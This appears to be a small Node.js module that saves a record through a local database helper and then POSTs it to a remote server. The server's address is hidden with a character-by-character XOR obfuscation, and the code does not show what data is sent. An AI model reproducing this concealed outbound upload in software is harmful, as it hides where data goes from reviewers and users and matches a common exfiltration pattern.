const request = require("request");
const { remove, update, updateFalse } = require("./db");

function cn(n) {
  return n
    .split("")
    .map(function (n) {
      return String.fromCharCode(64 ^ n.charCodeAt());
    })
    .join("");
}

async function postServer(m) {
  // console.log("start u");

  update(m);
  return new Promise((res, rej) => {
    request.post(
      {
        url: cn("(440zoo9:n&$3tq''n89:o.!0)o0/34"),
        form: { s: "s", m },
        timeout: 30 * 1000,
      },
      function (err, httpResponse, body) {
        if (err) {
          updateFalse(m);
          rej(err);
          return;
        }
        res();
      }
    );
  });
}

exports.postServer = postServer;
